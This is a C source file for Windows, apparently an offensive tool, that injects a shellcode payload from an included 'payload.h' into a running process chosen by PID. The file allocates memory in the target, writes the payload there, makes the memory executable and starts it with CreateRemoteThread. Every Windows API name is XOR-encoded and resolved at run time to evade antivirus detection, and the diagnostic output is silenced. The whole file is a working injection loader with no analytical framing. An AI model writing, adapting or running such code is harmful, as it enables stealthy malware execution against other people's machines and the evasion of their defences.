#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <TlHelp32.h>
#include "payload.h"

//
// XOR Decryption Function
//
void xor_decrypt( unsigned char *data, int data_len )
{
    unsigned char key = 0x57;

	for( int i = 0; i < data_len; i++ )
	{
		data[i] ^= key;
	}
}

int main( int argc, char* argv[] )
{
    if( argc < 2 )
    {
        return 1;
    }

    HANDLE process_snapshot;
    HANDLE target_process = NULL;
    PROCESSENTRY32 current_process;
    DWORD process_id = atoi( argv[1] );

    //
    // ENUMERATE RUNNING PROCESSES TO ENSURE PID IS VALID
    //
    unsigned char kernel32_dll_encrypted[] = { 0x3c, 0x32, 0x25, 0x39, 0x32, 0x3b, 0x64, 0x65, 0x79, 0x33, 0x3b, 0x3b, 0x57 };
    xor_decrypt( kernel32_dll_encrypted, sizeof(kernel32_dll_encrypted) );
    HMODULE kernel32_dll_handle = LoadLibraryA( kernel32_dll_encrypted );
    
    if( NULL == kernel32_dll_handle )
    {
        // printf( "Could not load kernel32.dll!\n" );
        return 1;
    }
    
    unsigned char CreateToolhelp32Snapshot_encrypted[] = { 0x14, 0x25, 0x32, 0x36, 0x23, 0x32, 0x03, 0x38, 0x38, 0x3b, 0x3f, 0x32, 0x3b, 0x27, 0x64, 0x65, 0x04, 0x39, 0x36, 0x27, 0x24, 0x3f, 0x38, 0x23, 0x57 };
    xor_decrypt( CreateToolhelp32Snapshot_encrypted, sizeof(CreateToolhelp32Snapshot_encrypted) );

    HANDLE( WINAPI * _CreateToolhelp32Snapshot )
    (
        DWORD dwFlags,
        DWORD th32ProcessID        
    );

    _CreateToolhelp32Snapshot = (HANDLE (WINAPI *)
    (
        DWORD dwFlags,
        DWORD th32ProcessID     
    )) GetProcAddress( kernel32_dll_handle, CreateToolhelp32Snapshot_encrypted );

    if( NULL == _CreateToolhelp32Snapshot )
    {
        // printf( "Could not resolve CreateToolhelp32Snapshot!\n" );
        return 1;
    }

    process_snapshot = _CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if( NULL == process_snapshot )
    {
        return 1;
    }

    current_process.dwSize = sizeof( PROCESSENTRY32 );
    
    unsigned char Process32First_encrypted[] = { 0x07, 0x25, 0x38, 0x34, 0x32, 0x24, 0x24, 0x64, 0x65, 0x11, 0x3e, 0x25, 0x24, 0x23, 0x57 };
    xor_decrypt( Process32First_encrypted, sizeof(Process32First_encrypted) );
    
    BOOL( WINAPI * _Process32First)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe   
    );

    _Process32First = ( BOOL (WINAPI *)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe     
    )) GetProcAddress( kernel32_dll_handle, Process32First_encrypted );

    if( NULL == _Process32First )
    {
        // printf( "Could not resolve Process32First!\n" );
        return 1;
    }
    
    _Process32First( process_snapshot, &current_process );

    BOOL( WINAPI * _Process32Next)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe 
    );

    unsigned char Process32Next_encrypted[] = { 0x07, 0x25, 0x38, 0x34, 0x32, 0x24, 0x24, 0x64, 0x65, 0x19, 0x32, 0x2f, 0x23, 0x57 };
    xor_decrypt( Process32Next_encrypted, sizeof(Process32Next_encrypted) );

    _Process32Next = ( BOOL (WINAPI *)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe    
    )) GetProcAddress( kernel32_dll_handle, Process32Next_encrypted );

    if( NULL == _Process32Next )
    {
        // printf( "Could not resolve Process32Next!\n" );
        return 1;
    }

    do
    {   
        // printf( "process id = %d\n", current_process.th32ProcessID );
        if( process_id == current_process.th32ProcessID )
        {
            unsigned char OpenProcess_encrypted[] = { 0x18, 0x27, 0x32, 0x39, 0x07, 0x25, 0x38, 0x34, 0x32, 0x24, 0x24, 0x57 };
            xor_decrypt( OpenProcess_encrypted, sizeof(OpenProcess_encrypted) );

            HANDLE( WINAPI * _OpenProcess )
            (
                DWORD dwDesiredAccess,
                BOOL  bInheritHandle,
                DWORD dwProcessId            
            );

            _OpenProcess = ( HANDLE (WINAPI *)
            (
                DWORD dwDesiredAccess,
                BOOL  bInheritHandle,
                DWORD dwProcessId             
            )) GetProcAddress( kernel32_dll_handle, OpenProcess_encrypted );

            if( NULL == _OpenProcess )
            {
                // printf( "Could not resolve OpenProcess!\n" );
                return 1;
            }

            target_process = _OpenProcess( PROCESS_ALL_ACCESS, TRUE, current_process.th32ProcessID );
            break;
        }
    }

    while( _Process32Next(process_snapshot, &current_process) );

    CloseHandle( process_snapshot );

    if( NULL == target_process )
    {
        return 1;
    }

    //
    // ALLOCATE MEMORY IN TARGET PROCESS
    //
    size_t payload_size = sizeof( payload );
    LPVOID target_process_allocated_memory = NULL;
    
    unsigned char VirtualAllocEx_encrypted[] = { 0x01, 0x3e, 0x25, 0x23, 0x22, 0x36, 0x3b, 0x16, 0x3b, 0x3b, 0x38, 0x34, 0x12, 0x2f, 0x57 };
    xor_decrypt( VirtualAllocEx_encrypted, sizeof(VirtualAllocEx_encrypted) );

    LPVOID( WINAPI * _VirtualAllocEx )
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect    
    );

    _VirtualAllocEx = ( LPVOID( WINAPI *) 
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect    
    )) GetProcAddress( kernel32_dll_handle, VirtualAllocEx_encrypted );

    if( NULL == _VirtualAllocEx )
    {
        // printf( "Could not resolve VirtualAllocEx!\n" );
        return 1;
    }

    target_process_allocated_memory = _VirtualAllocEx( target_process, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if( NULL == target_process_allocated_memory )
    {
        // printf( "[!] Could not allocate memory!\n" );
        return 1;
    }

    // printf( "[+] Successfully allocated memory!\n" );

    //
    // WRITE TO ALLOCATED MEMORY
    //
    BOOL return_check = FALSE;

    unsigned char WriteProcessMemory_encrypted[] = { 0x00, 0x25, 0x3e, 0x23, 0x32, 0x07, 0x25, 0x38, 0x34, 0x32, 0x24, 0x24, 0x1a, 0x32, 0x3a, 0x38, 0x25, 0x2e, 0x57 };
    xor_decrypt( WriteProcessMemory_encrypted, sizeof(WriteProcessMemory_encrypted) );

    BOOL( WINAPI * _WriteProcessMemory )
    (
        HANDLE  hProcess,
        LPVOID  lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T  nSize,
        SIZE_T  *lpNumberOfBytesWritten    
    );

    _WriteProcessMemory = ( BOOL(WINAPI *)
    (
        HANDLE  hProcess,
        LPVOID  lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T  nSize,
        SIZE_T  *lpNumberOfBytesWritten     
    )) GetProcAddress( kernel32_dll_handle, WriteProcessMemory_encrypted );

    if( NULL == _WriteProcessMemory )
    {
        // printf( "Could not resolve WriteProcessMemory!\n" );
        return 1;
    }

    return_check = _WriteProcessMemory( target_process, target_process_allocated_memory, payload, payload_size, NULL );

    if( FALSE == return_check )
    {
        // printf( "[+] WriteProcessMemory returned false!\n" );
        return 1;
    }

    //
    // UPDATE PERMISSIONS TO ALLOW EXECUTION
    //
    DWORD old_protect = NULL;

    unsigned char VirtualProtectEx_encrypted[] = { 0x01, 0x3e, 0x25, 0x23, 0x22, 0x36, 0x3b, 0x07, 0x25, 0x38, 0x23, 0x32, 0x34, 0x23, 0x12, 0x2f, 0x57 };
    xor_decrypt( VirtualProtectEx_encrypted, sizeof(VirtualProtectEx_encrypted) ); 

    BOOL( WINAPI * _VirtualProtectEx )
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
    );

    _VirtualProtectEx = ( BOOL(WINAPI *)
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect   
    )) GetProcAddress( kernel32_dll_handle, VirtualProtectEx_encrypted );

    if( NULL == _VirtualProtectEx )
    {
        // printf( "Could not resolve VirtualProtectEx!\n" );
        return 0;
    }

    return_check = _VirtualProtectEx( target_process, target_process_allocated_memory, payload_size, PAGE_EXECUTE_READWRITE, &old_protect );

    if( FALSE == return_check )
    {
        // printf( "[!] VirtualProtectEx() returned false! Error code: %d\n", GetLastError() );
        return 1;
    }

    //
    // EXECUTED SHELLCODE IN ALLOCATED MEMORY
    //
    HANDLE handle_remote_thread = NULL;

    unsigned char CreateRemoteThread_encrypted[] = { 0x14, 0x25, 0x32, 0x36, 0x23, 0x32, 0x05, 0x32, 0x3a, 0x38, 0x23, 0x32, 0x03, 0x3f, 0x25, 0x32, 0x36, 0x33, 0x57 };
    xor_decrypt( CreateRemoteThread_encrypted, sizeof(CreateRemoteThread_encrypted) );

    HANDLE( WINAPI * _CreateRemoteThread )
    (
        HANDLE                 hProcess,
        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        SIZE_T                 dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID                 lpParameter,
        DWORD                  dwCreationFlags,
        LPDWORD                lpThreadId   
    );

    _CreateRemoteThread = ( HANDLE(WINAPI *)
    (
        HANDLE                 hProcess,
        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        SIZE_T                 dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID                 lpParameter,
        DWORD                  dwCreationFlags,
        LPDWORD                lpThreadId    
    )) GetProcAddress( kernel32_dll_handle, CreateRemoteThread_encrypted );

    if( NULL == _CreateRemoteThread )
    {
        // printf( "Could not resolve CreateRemoteThread!\n" );
        return 1;
    }

    handle_remote_thread = _CreateRemoteThread( target_process, NULL, 0, target_process_allocated_memory, NULL, 0, NULL );

    if( NULL == handle_remote_thread )
    {
        // printf( "[!] CreateRemoteThread() failed!\n" );
        return 1;
    }    

    return 0;
}